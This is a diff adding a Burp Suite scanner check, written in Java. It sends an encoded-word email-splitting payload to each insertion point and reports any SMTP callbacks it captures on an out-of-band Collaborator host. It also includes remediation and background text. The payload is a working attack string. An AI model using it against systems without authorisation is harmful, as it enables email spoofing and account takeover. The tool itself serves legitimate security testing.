@@ -1,0 +1,65 @@
+id: 352f58b4-efb0-49ba-9d8d-0901cd5e237c
+name: Email splitting collaborator client
+function: SCAN_CHECK_ACTIVE_PER_INSERTION_POINT
+location: SCANNER
+source: |
+  /**
+   * Performs an email splitting attack using encoded word.
+   * The Collaborator client is used to retrieve interactions.
+   * You should change the spoofServer to be your target domain e.g. example.com
+   * You can add more techniques using the techniques variable.
+   *
+   * @author Gareth Heyes
+  **/
+
+  var POLL_SLEEP = 1_000;
+  var TOTAL_TIME = 10_000;
+  var spoofServer = "target.domain";
+  var collaboratorClient = api().collaborator().createClient();
+  var techniques = new String[]{
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=00?=foo@$SPOOF_SERVER"
+  };
+
+  HashMap<String, HttpRequestResponse> requestResponsesSent = new HashMap<>();
+
+  for(var technique: techniques) {
+     var payload = collaboratorClient.generatePayload();
+     technique = technique.replaceAll("[$]COLLABORATOR_SERVER", payload.server().get().address());
+     technique = technique.replaceAll("[$]COLLABORATOR_PAYLOAD", payload.id().toString());
+     technique = technique.replaceAll("[$]SPOOF_SERVER", spoofServer);
+  	HttpRequestResponse reqResp = http.sendRequest(insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(technique)));
+     requestResponsesSent.put(payload.id().toString(), reqResp);
+  }
+
+  List<AuditIssue> auditIssues = new ArrayList<>();
+
+  Function<String, String> newLinesToBr = s -> s.replaceAll("\r?\n","<br>");
+
+  try {
+      long start = System.currentTimeMillis();
+      while (true) {
+          if (System.currentTimeMillis() - start >= TOTAL_TIME) break;
+          List<Interaction> list = collaboratorClient.getAllInteractions();
+          if (!list.isEmpty()) {
+              for (Interaction i : list) {
+                  if (!i.smtpDetails().isPresent()) continue;                
+                  var id = i.id().toString();
+                  var conversation = i.smtpDetails().get().conversation().substring(0, 500) + "...";
+                  var title = "Email address parser discrepancy";
+                  var detail = "This site is vulnerable to an email splitting attack below is the SMTP conversation:"+utilities().htmlUtils().encode(conversation);
+                  var remediation = """
+  - Reject any address containing =? … ?= (“encoded-word”) patterns with a simple regex such as =[?].+[?]= before further processing.
+  - Disable or strictly configure legacy address parsing features in mail libraries (UUCP bang paths, source routes, UTF-7, IDN/Punycode) whenever they are not required.
+  - Never base authorisation decisions solely on the claimed email domain. Instead, verify ownership (for example, by sending a one-time link) or use cryptographically strong identity assertions.
+  - Ensure server-side validation is performed by the same library that ultimately sends or stores the address, avoiding mixed-parser discrepancies.                
+                  """;
+                  var background = "Email syntax is governed by decades-old RFCs that permit comments, quoted local-parts, multiple encodings and obsolete routing notations. Modern web applications often validate addresses with a simple regex or framework helper, then pass them to deeper libraries (SMTP clients, IDN converters, etc.). An attacker can embed control characters or secondary @ symbols that survive the first check but are re-interpreted later, redirecting mail delivery or splitting the address during SMTP dialogue. The impact ranges from account takeover to cross-tenant data exposure and, where rendered in HTML contexts, stored XSS leading to RCE.";
+                  var remediationBackground = "The simplest and most effective defence is disable: “encoded-word” as they are unnecessary in user registration flows and can be blocked cheaply. Disabling rarely used address forms in mail libraries closes additional vectors, while eliminating domain-based access checks removes the underlying trust flaw. Where email addresses must be accepted verbatim (for example, mail clients), sanitise or escape them before insertion into HTML or SQL contexts and confirm delivery via out-of-band verification.";               
+                  auditIssues.add(AuditIssue.auditIssue(title, newLinesToBr.apply(title), newLinesToBr.apply(remediation), requestResponse.request().url(), AuditIssueSeverity.MEDIUM, AuditIssueConfidence.FIRM, newLinesToBr.apply(background), newLinesToBr.apply(remediationBackground), AuditIssueSeverity.MEDIUM, requestResponsesSent.get(id)));          
+              }
+          } 
+          java.util.concurrent.TimeUnit.MILLISECONDS.sleep(POLL_SLEEP);
+      }
+  } catch (InterruptedException ignored) {}
+      
+  return AuditResult.auditResult(auditIssues);
